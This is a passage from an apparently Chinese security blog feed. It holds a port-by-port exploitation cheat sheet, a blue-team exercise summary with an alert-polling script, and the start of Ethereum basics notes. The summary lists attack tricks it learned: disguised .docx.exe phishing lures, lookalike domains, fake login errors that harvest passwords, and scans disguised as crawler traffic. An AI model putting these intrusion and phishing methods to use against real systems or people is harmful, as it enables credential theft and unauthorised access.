xxx</td></tr><tr><td>445</td><td>smb</td><td>ms17010（Vista-win10）</td></tr><tr><td>512,513,514</td><td>rexec</td><td>hydra-gtk 进行爆破</td></tr><tr><td>1521</td><td>oracle</td><td>msf里tnspoison_checker模块</td></tr><tr><td>2181</td><td>zookeeper</td><td>echo envi 丨nc xx.xx.xx 2181</td></tr><tr><td>2323</td><td>uep</td><td>/config/CorrectConfigPwd.sh</td></tr><tr><td>2381</td><td>hp sys mgmt</td><td>msf里exploit/multi/http/hp_sys_mgmt_exec</td></tr><tr><td>1621</td><td>思科移动服务引擎</td><td>CVE-2013-3469 </td></tr><tr><td>2601,2604</td><td>zebra</td><td>telnet  xxx 2601 、默认密码zebra</td></tr><tr><td>3128</td><td>squid</td><td>squidclient -h xx.xx.xx.xx -p 80 mgr:info     </td></tr><tr><td>3389</td><td>rdp</td><td>cve-2019-0708,esteemaudit,ms12_020,shift 放大镜 输入法绕过 guest用户</td></tr><tr><td>5672</td><td>amqp</td><td>CVE-2017-8045</td></tr><tr><td>5900</td><td>vnc</td><td>msf中的scanner/vnc/vnc_none_auth,CVE-2006-2369:admin/vnc/realvnc_41_bypass</td></tr><tr><td>5984</td><td>CouchDB</td><td>弱口令</td></tr><tr><td>6066,7077</td><td>spark</td><td>msf里spark_unauth_rce</td></tr><tr><td>6379</td><td>redis</td><td>redis-cli -h xx.xx.xx.xx -p xx</td></tr><tr><td>8161</td><td>activmq</td><td>cve-2016-3088,cve-2015-5254 </td></tr><tr><td>8291</td><td>winbox</td><td>CVE-2018-14847:<a href="https://github.com/BasuCert/WinboxPoC" target="_blank" rel="noopener">https://github.com/BasuCert/WinboxPoC</a></td></tr><tr><td>8088</td><td>hadoop</td><td>YARN ResourceManager,msf里hadoop_unauth_exec</td></tr><tr><td>9001</td><td>supervisor</td><td>CVE-2017-11610</td></tr><tr><td>9090</td><td>jboss</td><td></td></tr><tr><td>9095</td><td>huawei</td><td>华为操作维护系统</td></tr><tr><td>9200</td><td>Elasticsearch</td><td>未授权，rce</td></tr><tr><td>10001</td><td>tomcat服务</td><td>tomcat CVE-2016-8735 </td></tr><tr><td>11211</td><td>Memcached</td><td>未授权</td></tr><tr><td>27017</td><td>MongoDB</td><td>弱口令</td></tr><tr><td>50070</td><td>hadoop</td><td>未授权</td></tr><tr><td>61616</td><td>activemq端口</td><td>CVE-2015-5254 反序列化</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;由于之前知识索引文章记录的太长了，大多数也是新知识点的建立，绕过方式的记录。&lt;br&gt;所以新开一篇文章，来记录平时主机层面的检测点及检测方法&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;测试点-方法速查&quot;&gt;&lt;a href=&quot;#测试点-方法速查&quot; class=&quot;h
      
    
    </summary>
    
    
    
      <category term="主机检测点索引" scheme="http://Vorders.me/tags/%E4%B8%BB%E6%9C%BA%E6%A3%80%E6%B5%8B%E7%82%B9%E7%B4%A2%E5%BC%95/"/>
    
      <category term="端口渗透tips" scheme="http://Vorders.me/tags/%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8Ftips/"/>
    
  </entry>
  
  <entry>
    <title>记一次防守总结</title>
    <link href="http://vorders.me/2019/07/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%98%B2%E5%AE%88%E6%80%BB%E7%BB%93/"/>
    <id>http://vorders.me/2019/07/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%98%B2%E5%AE%88%E6%80%BB%E7%BB%93/</id>
    <published>2019-07-01T10:00:58.000Z</published>
    <updated>2019-07-10T04:24:24.276Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>为期20天的某行动终于结束，期间见识到不少攻方大佬的神仙操作，也从我方大佬学习到不少防守/应急方面的知识。为此我打算梳理下近期学习/感悟到的一些知识点。</p></blockquote><h1 id="资产整理阶段"><a href="#资产整理阶段" class="headerlink" title="资产整理阶段"></a>资产整理阶段</h1><ul><li>资产整理</li></ul><p>初期的资产整理相当重要，尤其需要联合企业对内网系统的（网站名/域名/ip/框架/脚本/中间件/版本号/系统/补丁情况）等一系列资产信息做成excel表，方便进入正式防守阶段的应急响应/问题定位速度。<br>高亮标注互联网资产，方便应对初期的外部攻击。</p><ul><li>划分好内网情况</li></ul><p>各个网段对应的办公区域<br>如：<br>10.1.2 对应开发部<br>10.1.3 对应营销部</p><h1 id="防守阶段"><a href="#防守阶段" class="headerlink" title="防守阶段"></a>防守阶段</h1><h2 id="提高防守效率"><a href="#提高防守效率" class="headerlink" title="提高防守效率"></a>提高防守效率</h2><p>首先作为防守方，由于被动获取信息量太过庞大。为此我们只能通过查看apt、ips、ids、大数据等感知设备的告警方式，来识别攻击行为。但是在一家大企业里面，可能会用到多家公司的设备，那么频繁切换设备页面查看报警信息无疑会浪费大量时间。此时我们应当编写个整合apt/ips/大数据的报警信息的定时刷新脚本，来方便对告警信息监控（由于比较懒，就写了几个简易脚本分屏监控）。<br>ps:如果作为完整的监控一体化脚本的话推荐加入（误报去除/攻击ip地址聚合/ua等特征识别/ip频率统计）</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json,time,sys</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment">##-----check---------</span></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">4</span>:</span><br><span class="line">print(<span class="string">'[!] Usage: python %s 1.1.1.1 [admin] [password] \n'</span>%sys.argv[<span class="number">0</span>])</span><br><span class="line">exit(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">headers= &#123;</span><br><span class="line"><span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"</span>,</span><br><span class="line"><span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line"><span class="string">"Referer"</span>:<span class="string">""</span></span><br><span class="line">&#125;</span><br><span class="line">data=&#123;<span class="string">"endTime"</span>:<span class="string">""</span>,<span class="string">"startTime"</span>:<span class="string">""</span>,<span class="string">"from"</span>:<span class="number">0</span>,<span class="string">"size"</span>:<span class="number">500</span>,<span class="string">"interval"</span>:<span class="string">"默认"</span>,<span class="string">"searchTypeNum"</span>:<span class="number">2</span>,<span class="string">"queryStr"</span>:<span class="string">""</span>,<span class="string">"condition"</span>:&#123;<span class="string">"str"</span>:&#123;&#125;,<span class="string">"num"</span>:&#123;&#125;,<span class="string">"strNot"</span>:&#123;&#125;,<span class="string">"numNot"</span>:&#123;&#125;&#125;,<span class="string">"extraUi"</span>:&#123;<span class="string">"alarmStatus"</span>:&#123;<span class="string">"unprocessed"</span>:<span class="number">0</span>,<span class="string">"processing"</span>:<span class="number">0</span>,<span class="string">"processed"</span>:<span class="number">0</span>,<span class="string">"falsePositives"</span>:<span class="number">0</span>&#125;,<span class="string">"threatSeverity"</span>:&#123;<span class="string">"High"</span>:<span class="number">0</span>,<span class="string">"Medium"</span>:<span class="number">0</span>,<span class="string">"Low"</span>:<span class="number">0</span>&#125;,<span class="string">"killChain"</span>:&#123;<span class="string">"Scanning &amp; Probing"</span>:<span class="number">0</span>,<span class="string">"Penetration Attack"</span>:<span class="number">0</span>,<span class="string">"Obtain Permission"</span>:<span class="number">0</span>,<span class="string">"Command &amp; Control"</span>:<span class="number">0</span>,<span class="string">"Asset Destruction"</span>:<span class="number">0</span>,<span class="string">"others"</span>:<span class="number">0</span>&#125;,<span class="string">"attackIntent"</span>:&#123;<span class="string">"exploitAttack"</span>:<span class="number">0</span>,<span class="string">"maliciousFile"</span>:<span class="number">0</span>,<span class="string">"DoS"</span>:<span class="number">0</span>,<span class="string">"scanProbe"</span>:<span class="number">0</span>,<span class="string">"anomalyEvent"</span>:<span class="number">0</span>,<span class="string">"systemManagement"</span>:<span class="number">0</span>,<span class="string">"APT"</span>:<span class="number">0</span>,<span class="string">"others"</span>:<span class="number">0</span>&#125;,<span class="string">"srcSecurityZone"</span>:<span class="string">""</span>,<span class="string">"srcAddress"</span>:<span class="string">""</span>,<span class="string">"srcPort"</span>:<span class="string">""</span>,<span class="string">"srcUserName"</span>:<span class="string">""</span>,<span class="string">"direction"</span>:<span class="string">""</span>,<span class="string">"destSecurityZone"</span>:<span class="string">""</span>,<span class="string">"destAddress"</span>:<span class="string">""</span>,<span class="string">"destPort"</span>:<span class="string">""</span>,<span class="string">"destHostName"</span>:<span class="string">""</span>,<span class="string">"requestUrl"</span>:<span class="string">""</span>&#125;,<span class="string">"userName"</span>:<span class="string">"admin"</span>&#125;</span><br><span class="line">host=<span class="string">"https://"</span>+sys.argv[<span class="number">1</span>]</span><br><span class="line">username=sys.argv[<span class="number">2</span>]</span><br><span class="line">password=sys.argv[<span class="number">3</span>]</span><br><span class="line">headers[<span class="string">'Referer'</span>]=host+<span class="string">"/index.html"</span></span><br><span class="line">sum_=<span class="number">1</span></span><br><span class="line"><span class="comment"># data["queryStr"]=''' (NOT name:*DNS* AND NOT rawEvent:*youdao*) '''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##-----config---------</span></span><br><span class="line"><span class="comment">#设置显示字段</span></span><br><span class="line">display=[<span class="string">'起始时间(startTime)'</span>,<span class="string">'数据流方向(direction)'</span>,<span class="string">'来源IP(srcAddress)'</span>,<span class="string">'目的IP(destAddress)'</span>,<span class="string">'事件名称(name)'</span>]<span class="comment">#,'原始事件(rawEvent)'</span></span><br><span class="line"><span class="comment">#设置间隔时间/s</span></span><br><span class="line">interval = <span class="number">300</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">##-----login---------</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s=requests.Session()</span><br><span class="line">s.get(url=host+<span class="string">"/index.html"</span>,verify=<span class="keyword">False</span>)</span><br><span class="line">login=&#123;<span class="string">"username"</span>:username,<span class="string">"password"</span>:hashlib.sha1(password.encode(<span class="string">'utf-8'</span>)).hexdigest()&#125;</span><br><span class="line">s.post(url=host+<span class="string">'/api/login'</span>,headers=headers,data=login, verify=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">print(<span class="string">"[-] login error"</span>)</span><br><span class="line">exit(<span class="number">-1</span>)</span><br><span class="line"><span class="comment">##-----main---------</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">times=int(time.time())</span><br><span class="line">now = time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime(times))</span><br><span class="line">data[<span class="string">"startTime"</span>]=time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime(times-interval))</span><br><span class="line">data[<span class="string">"endTime"</span>]=time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime(times+<span class="number">120</span>))<span class="comment">#redress ailpha time</span></span><br><span class="line">headers[<span class="string">"Content-Type"</span>]=<span class="string">"application/json"</span></span><br><span class="line">html=s.post(url=host+<span class="string">"/api/search/events/getList"</span>,headers=headers,data=json.dumps(data), verify=<span class="keyword">False</span>).text</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">dic = json.loads(html)[<span class="string">"data"</span>][<span class="string">"data"</span>]</span><br><span class="line"><span class="keyword">except</span> :</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">count=len(dic)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(count,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line">print(<span class="string">'[+] '</span>,end=<span class="string">""</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> display:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">print(dic[j][i],end=<span class="string">" | "</span>)</span><br><span class="line"><span class="keyword">except</span> :</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">print(<span class="string">"\n"</span>)</span><br><span class="line">print(<span class="string">"[====================================================================================]"</span>)</span><br><span class="line">print(<span class="string">"[ 互联网ip事件监测 ]-[ &#123;t&#125; 分钟一次：第 &#123;x&#125; 次 ]-[ 事件 &#123;count&#125; 次 ]-[ &#123;now&#125; ]"</span>.format(host=host,t=int(interval/<span class="number">60</span>),x=sum_,count=count,now=now))</span><br><span class="line">print(<span class="string">"[====================================================================================]"</span>)</span><br><span class="line">time.sleep(interval)</span><br><span class="line">sum_+=<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="提高攻击识别率"><a href="#提高攻击识别率" class="headerlink" title="提高攻击识别率"></a>提高攻击识别率</h2><p>单看告警信息的话我们会忽略很多信息。比如处在第一步信息搜集阶段的目录扫描/域名扫描/账号变更的爆破尝试。</p><p>基于上述问题我在防守中想到的简单应对方式：</p><h3 id="0x00-日志筛选。"><a href="#0x00-日志筛选。" class="headerlink" title="0x00 日志筛选。"></a>0x00 日志筛选。</h3><p>如我们防守网站为java框架，日志访问信息中出现.php/.aspx文件访问请求，说明这些请求为目录扫描请求。</p><p>曾在防守时候见到一大串的.php文件扫描请求，根据导出日志进行筛选匹配，发现攻击者使用御剑进行目录扫描，由此我们可以在筛选中加入一些御剑里特有的目录进行防御。同时该类扫描会使用PUT请求来发送，在核实业务里面不存在该类请求方式后也可将PUT/DELETE…该类请求加入黑名单。</p><h3 id="0x01-频率统计"><a href="#0x01-频率统计" class="headerlink" title="0x01 频率统计"></a>0x01 频率统计</h3><p>攻击者可能在漏洞发现阶段对一个系统进行大量重复性的测试，而该类请求又不包含敏感操作，此时我们可以简单的对全天/指定时间段内日志进行导出，放入excel进行来源ip次数统计，统计数值大的可以认定为恶意ip。<br>同理可以对已知恶意ip做一个聚类分析，在防守阶段我们发现针对我们的攻击ip显著分布于北京/江苏地区，且大量ip来源于一个小众idc。</p><h3 id="0x02-来源ip的反查"><a href="#0x02-来源ip的反查" class="headerlink" title="0x02 来源ip的反查"></a>0x02 来源ip的反查</h3><p>借助<a href="http://tool.chinaz.com/ipwhois/" target="_blank" rel="noopener">ip反查whois</a>等网站接口实现自动的反查ip关联信息。</p><p>在防守中遇到有老哥使用自己的vps，同时vps上绑定过相关域名信息，此时可以通过获取到的相关邮箱等信息进行一波反向社工</p><h3 id="0x03-ua的识别"><a href="#0x03-ua的识别" class="headerlink" title="0x03 ua的识别"></a>0x03 ua的识别</h3><p>有些使用脚本的老哥可能忘记在脚本里面加入ua导致默认请求里面包含python-request头。</p><p>或者这些老哥没有引入随机ua头，导致相关的攻击行为容易通过ua特征识别出来。<br>ps:这些攻击者特别喜欢使用mac os，见到mac的ua头可以留意一下</p><h2 id="应急"><a href="#应急" class="headerlink" title="应急"></a>应急</h2><p>终端主机发现问题：</p><ul><li>先断网</li><li>保持开机</li><li>等待从业人员现场分析</li></ul><p>如确定相关病毒文件后：<br>在线沙箱丢进去分析一下<br>先查看设备开放端口  <code>netstat -ano | more</code><br>使用<a href="https://www.nirsoft.net/utils/dns_query_sniffer.html" target="_blank" rel="noopener">DNSQuerySniffer</a>查看可疑的域名<br>借助<a href="https://www.nirsoft.net/utils/live_tcp_udp_watch.html" target="_blank" rel="noopener">LiveTcpUdpWatch</a>将可疑域名与pid对应起来<br>安装sysmon 配置方式<code>sysmon.exe -i -accepteula -h md5 -n -l</code>(ps:可以将sysmon名称和资源更改为qq等常用软件名字逃过恶意软件反侦察)<br>在事件查看器-应用程序和服务日志-\Microsoft\windows\sysmon 中打开optional查看进程创建相关。追溯到原始恶意文件</p><h2 id="蜜罐的使用"><a href="#蜜罐的使用" class="headerlink" title="蜜罐的使用"></a>蜜罐的使用</h2><p>蜜罐可采用内外双布局的方式，布局内网有效感知内网横向攻击行为。布局外网的话可以使用mysql反读文件/页面嵌入js调用各社交网站的api来获取攻击者的相关信息。</p><h1 id="学到的攻击思路"><a href="#学到的攻击思路" class="headerlink" title="学到的攻击思路"></a>学到的攻击思路</h1><h2 id="0x00-针对钓鱼的思路"><a href="#0x00-针对钓鱼的思路" class="headerlink" title="0x00 针对钓鱼的思路"></a>0x00 针对钓鱼的思路</h2><p>ps:被第一天的反钓思路秀到。</p><p>正常的钓鱼思路可以：</p><ul><li>廉价的钓鱼</li></ul><p>将exe或相关执行文件的图标伪造成excel，文件名.docx.exe 此方法无需相关0day漏洞及具有一定迷惑性。</p><ul><li>在邮件中引入url</li></ul><p>使用相似域名做钓鱼系统,具体参考：unicode相关编码伪造成与目标域名相类似的地址进行钓鱼</p><ul><li>增加钓鱼成功率</li></ul><p>钓鱼登录界面加入错误提示，用来收集多个用户密码</p><h2 id="0x01-其他"><a href="#0x01-其他" class="headerlink" title="0x01 其他"></a>0x01 其他</h2><p>某些防御设备会报爬虫行为，在开始信息搜集阶段，可以将ua伪造成google/360/sougou等搜索引擎爬虫，并混入正常流量，将扫描目录/子域名的行为伪装为爬虫所干。</p><p>弱口令命名格式：xx@年份 如：admin@2010 、 admin@2011.、Aalibaba123456、<br>绕过思路：</p><pre><code>1. 请求头里面加命令 payload函数调用请求头绕waf2. 和xss localtion 一个思路截取 ;后url来绕waf</code></pre><p>github搜邮箱/各种搜邮箱猜解密码进去<br>CSDN搜索开发ID、邮箱、qq<br>没安装控件可能页面空白<br>webshell使用冰蝎<br>目录中查找相对于开发测试环境xxxx/v4/</p><h2 id="0x02-其他大佬那看到的思路"><a href="#0x02-其他大佬那看到的思路" class="headerlink" title="0x02 其他大佬那看到的思路"></a>0x02 其他大佬那看到的思路</h2><blockquote><ul><li><p>该自动化就去自动。# 用nessus配置规则去识别资产信息，这个确实秀的我一脸，以前一直不太注意nessus，这次大佬用这个斩获了一个2000多分漏洞，滋滋滋  ！get到了。</p></li><li><p>多注意边缘文件，越是端口号靠后的越要注意。1级目录不行那就2级，2级不行就3级，总会搞到点意外的东西。</p></li><li><p>在内网横向的时候，ICMP和广播地址结合来扫描局域网内的所有主机。 # 这个操作也是秀的我头皮发麻，详情可以去看看tcpping这个工具，使用的ICMP的特性，穿透防火墙/过滤。</p></li></ul></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;为期20天的某行动终于结束，期间见识到不少攻方大佬的神仙操作，也从我方大佬学习到不少防守/应急方面的知识。为此我打算梳理下近期学习/感悟到的一些知识点。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;资产整理阶段&quot;&gt;&lt;a href=&quot;#资产整
      
    
    </summary>
    
    
    
      <category term="hw" scheme="http://Vorders.me/tags/hw/"/>
    
  </entry>
  
  <entry>
    <title>以太坊合约安全top10学习</title>
    <link href="http://vorders.me/2019/03/12/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8top10%E5%85%A5%E9%97%A8/"/>
    <id>http://vorders.me/2019/03/12/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8top10%E5%85%A5%E9%97%A8/</id>
    <published>2019-03-12T03:50:23.000Z</published>
    <updated>2020-01-21T03:39:31.998Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>——–本文作为学习时的笔记，重点讲述：<strong>合约攻击 Dasp Top10 的入门</strong>——–</p></blockquote><h1 id="前置一点区块链概念"><a href="#前置一点区块链概念" class="headerlink" title="前置一点区块链概念"></a>前置一点区块链概念</h1><p>概念入门推荐：</p><blockquote><p><a href="https://ethfans.org/ajian1984/articles/35649" target="_blank" rel="noopener">https://ethfans.org/ajian1984/articles/35649</a><br><a href="https://ethfans.org/posts/wtf-is-the-blockchain" target="_blank" rel="noopener">https://ethfans.org/posts/wtf-is-the-blockchain</a></p></blockquote><h2 id="区块"><a href="#区块" class="headerlink" title="区块"></a>区块</h2><p>写入信息，hash（基于上一条信息的hash）。</p><p>类比转账系统的话，记录x转账x，交易数额，签名等信息</p><p>数据结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public class Block &#123;</span><br><span class="line">  public String data;</span><br><span class="line">  public String hash;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="链"><a href="#链" class="headerlink" title="链"></a>链</h2><p>本区块的信息hash加密于上一区块hash值+本区块信息</p><p>即 h2=h1+i2</p><p>关于初始加密值。由于h1无上一区块</p><p>h1=h0+i1<br>h0 为默认值</p><h2 id="POW-工作量证明"><a href="#POW-工作量证明" class="headerlink" title="POW 工作量证明"></a>POW 工作量证明</h2><p>比特币网络中任何一个节点，如果想生成一个新的区块并写入区块链，必须解出比特币网络的PoW的题目，谁先算出来谁就获胜。</p><p>解出比特币网络PoW题目关键3个要素是：工作证明函数、区块和难度值。</p><hr><h1 id="以太坊一些概念"><a href="#以太坊一些概念" class="headerlink" title="以太坊一些概念"></a>以太坊一些概念</h1><blockquote><p>入门&amp;&amp;具体细节 <a href="https://ethfans.org/wikis/Home" target="_blank" rel="noopener">https://ethfans.org/wikis/Home</a></p></blockquote><h2 id="以太坊账户类型"><a href="#以太坊账户类型" class="headerlink" title="以太坊账户类型"></a>以太坊账户类型</h2><h3 id="外部拥有账户-EOA"><a href="#外部拥有账户-EOA" class="headerlink" title="外部拥有账户(EOA)"></a>外部拥有账户(EOA)</h3><p>只存储ETH的账户Externally Owned Accounts (EOAs)，可用私钥生成交易签名向这些账户支付ETH</p><p>特性：</p><ul><li>有 ether 余额</li><li>可以发送交易（以太币转账或者激活合约代码）</li><li>通过私钥控制</li><li>没有相关联的代码</li></ul><p>例子：<a href="https://etherscan.io/address/0x2d7c76202834a11a99576acf2ca95a7e66928ba0" target="_blank" rel="noopener">https://etherscan.io/address/0x2d7c76202834a11a99576acf2ca95a7e66928ba0</a></p><h3 id="合约账号"><a href="#合约账号" class="headerlink" title="合约账号"></a>合约账号</h3><p>存储合约+ETH的账户</p><p>特性：</p><ul><li>有 ether 余额</li><li>含有代码</li><li>代码执行是通过交易或者其他合约发送的call来激活</li><li>拥有自己的独立存储状态，且可以调用其他合约</li></ul><p>例子：<a href="https://etherscan.io/address/0xcbe1060ee68bc0fed3c00f13d6f110b7eb6434f6#code" target="_blank" rel="noopener">https://etherscan.io/address/0xcbe1060ee68bc0fed3c00f13d6f110b7eb6434f6#code</a></p><p>合约账号由外部账号+合约代码创建。</p><h2 id="合约语言"><a href="#合约语言" class="headerlink" title="合约语言"></a>合约语言</h2><ul><li>Solidity – 和Javascript语言类似。这是目前最受欢迎的和功能丰富的智能合约脚本语言。</li><li>Serpent – 和Python语言类似，在以太坊历史的早期受欢迎。</li><li>LLL (Lisp Like Language) – 和Lisp类似，只有在早期使用。它大概是最难用的。</li></ul><p>以太坊软件:geth,eth,pyethapp</p><p>geth (Go语言客户端） <a href="https://github.com/ethereum/go-ethereum" target="_blank" rel="noopener">https://github.com/ethereum/go-ethereum</a><br>eth ( C++客户端) <a href="https://github.com/ethereum/cpp-ethereum" target="_blank" rel="noopener">https://github.com/ethereum/cpp-ethereum</a><br>pyethapp (Python客户端) <a href="https://github.com/ethereum/pyethapp" target="_blank" rel="noopener">https://github.com/ethereum/pyethapp</a></p><p>最受欢迎的图形化软件是Mist(<a href="https://github.com/ethereum/mistMist" target="_blank" rel="noopener">https://github.com/ethereum/mistMist</a></p><h2 id="Gas和Gas价格"><a href="#Gas和Gas价格" class="headerlink" title="Gas和Gas价格"></a>Gas和Gas价格</h2><p>Gas是激活智能合约后，支付给运行合约人的报酬。</p><p>付款款项（单位以太币）＝ Gas数量（单位Gas） x Gas价格（单位以太币／Gas）</p><p>智能合约越复杂（计算步骤的数量和类型，占用的内存等），用来完成运行就需要越多Gas。（即Gas数量由合约复杂度规定，且固定）</p><p>Gas价格由想运行合约的人规定（每个矿工会根据Gas的价格的高低来决定他们是否想作为区块的一部分去运行此合约。）</p><blockquote><p><strong>Gas的目的</strong> 让智能合约花费Gas/以太币/钱可以防止人们随意激活合约， 解决了垃圾交易以及相关问题，如果运行智能合约免费，此类问题会发生</p></blockquote><p><img src="http://upyun-assets.ethfans.org/uploads/photo/image/4fe9f91423bb4916bf0795a3d6d6d94c.jpg" alt="ETH单位转换"></p><h2 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h2><ul><li>消息的接受者</li><li>私钥签名</li><li>ETH （按wei为单位）</li><li>可选数据域（保存使用者请求合约的消息）</li><li>Gas limit （运行一次合约的最大gas）（&lt;=可被执行，&gt;会导致操作复原）</li><li>Gas price （Gas价格，一单位的gas表示执行一个基本指令<code>如：计算步骤</code>）</li></ul><p>合约具有发送”消息”到其他合约的能力。消息是一个永不串行且只在以太坊执行环境中存在的虚拟对象。他们可以被理解为函数调用（function calls）。</p><ul><li><p>GasUsed：该交易消耗的总gas数量</p></li><li><p>GasPrice：该交易中单位gas的价格（用以太币计算）</p></li></ul><p>交易费=GasUsed * GasPrice</p><p>GasUsed<br>每个EVM（以太坊虚拟机，即合约）中的命令都被设置了相应的gas消耗值。gasUsed是所有被执行的命令的gas消耗值总和。</p><p>GasPrice<br>一个用户可以构建和签名一笔交易，但每个用户都可以各自设置自己希望使用的gasPrice，甚至可以是0。然而，以太坊客户端的Frontier版本有一个默认的gasPrice，即0.05e12 wei。矿工为了最大化他们的收益，如果大量的交易都是使用默认gasPrice即0.05e12 wei，那么基本上就很难又矿工去接受一个低gasPrice交易，更别说0 gasPrice交易了。</p><h2 id="区块gas-limit和gas-limit"><a href="#区块gas-limit和gas-limit" class="headerlink" title="区块gas limit和gas limit"></a>区块gas limit和gas limit</h2><p><strong>gas limit</strong>： </p><ul><li>合约里面执行设置的gas上限</li></ul><p><strong>区块gas limit</strong>： </p><ul><li>区块上使用的gas上限</li></ul><p><strong>谁来决定</strong></p><ul><li>区块的gas limit是由在网络上的矿工决定的。与可调整的区块gas limit协议不同的是一个默认的挖矿策略，即大多数客户端默认最小区块gas limit为4,712,388。</li></ul><p><strong>区块gas limit是怎样改变的</strong></p><ul><li>以太坊上的矿工需要用一个挖矿软件，例如ethminer。它会连接到一个geth或者Parity以太坊客户端。Geth和Pairty都有让矿工可以更改配置的选项。这里是geth挖矿命令行选项以及Parity的选项。<br>以太坊协议中存在着让矿工可以通过投票来决定gas limit的机制，所以区块容量不需要经过硬分叉就可以调整。最初，这个机制和另一个默认策略是绑定在一起的，即矿工默认投票使区块gas limit至少有470万，并且趋向于最近1024个区块gas使用量的1.5倍。这使得区块容量会根据需求来自动上升，同时也有一个可用来防御垃圾交易的限制。</li></ul><h2 id="钱包"><a href="#钱包" class="headerlink" title="钱包"></a>钱包</h2><p><strong>钱包生成&amp;&amp;交易</strong></p><p>首先自己随机生成 64位16进制值/256位2进制值 称为k(私钥)</p><p>椭圆曲线是通过 y² = x³ + ax + b 公式得出的，其中 a 和 b 可以自定义</p><p>k通过ECDSA(椭圆曲线算法)(secp256k1)得到64byte整数（由2个32byte的整数串联组成,称为X,Y）（这串64byte整数称之为K公钥）</p><p>K通过 Keccak-256加密算法取结果的后20byte 作为地址</p><p>A(账户地址)——–&gt;交易，需要A使用k生成数字签名———-&gt;B(账户地址)</p><p><strong>keystore &amp;&amp; password </strong></p><p>在以太坊官方钱包中，k(私钥)和K(公钥)都会以加密形式(创建钱包时设置的密码称为password)保存在JSON中<code>/Users/yourname/Library/Ethereum/keystore</code>,此JSON<br>为keystore</p><h2 id="奖励机制"><a href="#奖励机制" class="headerlink" title="奖励机制"></a>奖励机制</h2><p>1.区块奖励，每挖出一个区块奖励3eth。</p><p>2.叔块奖励，每引用一个叔块奖励3<em>（1/32）的奖励，最多引用两个。同时叔块也会由于被引用而得到3</em>（7/8）的奖励。</p><p>3.gas奖励，奖励在挖出的区块中的交易手续费。</p><hr><h1 id="智能合约"><a href="#智能合约" class="headerlink" title="智能合约"></a>智能合约</h1><h2 id="语法教程推荐"><a href="#语法教程推荐" class="headerlink" title="语法教程推荐"></a>语法教程推荐</h2><p>语法教程 </p><blockquote><p><a 